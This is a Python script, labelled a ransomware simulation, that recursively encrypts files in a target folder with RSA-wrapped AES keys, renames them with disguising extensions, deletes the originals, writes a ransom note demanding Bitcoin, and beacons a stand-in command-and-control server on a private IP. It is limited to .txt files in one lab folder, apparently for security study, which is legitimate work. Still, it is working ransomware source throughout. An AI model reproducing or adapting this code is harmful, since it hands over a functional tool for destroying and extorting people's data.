import os
import socket
from pathlib import Path
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Random import get_random_bytes

FAKE_EXTENSIONS = {
    "1": "doc",
    "2": "mp3",
    "3": "jpg",
    "4": "xl"
}
RANSOM_NOTE_NAME = "README_RESTORE_FILES.txt"

def scan_files(top_dir):
    """Recursively finds all files in a directory."""
    for entry in os.scandir(top_dir):
        if entry.is_file():
            yield entry.path
        else:
            yield from scan_files(entry.path)


def encrypt_file(file_path, public_key_path, fake_ext):
    """Encrypts a single file using a hybrid RSA+AES scheme."""
    try:
        with open(public_key_path, 'rb') as f:
            pubkey_data = f.read()
        
        with open(file_path, 'rb') as f:
            file_data = f.read()

        session_key = get_random_bytes(16)
        
        rsa_key = RSA.import_key(pubkey_data)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_session_key = cipher_rsa.encrypt(session_key)

        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(file_data)

        base_name = os.path.splitext(file_path)[0]
        new_filename = f"{base_name}.{fake_ext}.locked"

        with open(new_filename, 'wb') as f_out:
            f_out.write(encrypted_session_key)
            f_out.write(cipher_aes.nonce)
            f_out.write(tag)
            f_out.write(ciphertext)

        os.remove(file_path)
        print(f"Encrypted: {file_path} -> {new_filename}")

    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")


def drop_ransom_note(folder_path):
    """Creates the ransom note on the user's desktop."""
    note_content = """
    All your files have been encrypted!

    Your documents, photos, databases, and other important files are no longer accessible.
    To recover your files, you need to pay a ransom.

    Send 0.5 BTC to the wallet address: 1ABCDeFGHijkLMnOPqRSTuvWXYZ
    Then email us at fake_hacker_email@proton.me with your transaction ID.

    Do not try to rename the files or use third-party software, as this may result in permanent data loss.
    """
    note_path = os.path.join(folder_path, RANSOM_NOTE_NAME)
    with open(note_path, "w") as f:
        f.write(note_content)
    print(f"Ransom note dropped at {note_path}")


def simulate_network_traffic(server_ip="192.168.56.1"):
    """Simulates sending a signal to a 'command and control' server."""
    try:
        print(f"Connecting to fake C2 server at IP: {server_ip}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3) 
            s.connect((server_ip, 80)) 
            s.sendall(b"GET /key_sent HTTP/1.1\r\nHost: c2.server.local\r\n\r\n")
        print("Successfully sent signal to C2 server.")
    except Exception as e:
        print(f"Network simulation failed: {e}")

if __name__ == "__main__":

    target_folder = "C:\\Users\\kali\\Desktop\\secret"
    public_key_file = "public.pem"

    if not os.path.isdir(target_folder):
        print(f"Error: Target folder '{target_folder}' not found. Please create it.")
    else:

        print("--- Ransomware Simulation ---")
        print("Choose a fake extension for the encrypted files:")
        print("  1: .doc\n  2: .mp3\n  3: .jpg\n  4: .xl")
        choice = input("Your choice (1-4): ").strip()
        
        fake_extension = FAKE_EXTENSIONS.get(choice, "doc")
        
        print(f"\nStarting encryption in '{target_folder}'...")
        
        for file_to_encrypt in scan_files(target_folder):
            if file_to_encrypt.endswith(".txt"):
                encrypt_file(file_to_encrypt, public_key_file, fake_extension)
        
        print("\nEncryption phase complete.")
        
        drop_ransom_note(target_folder)

        simulate_network_traffic()
        
        print("\n--- Simulation Finished ---")
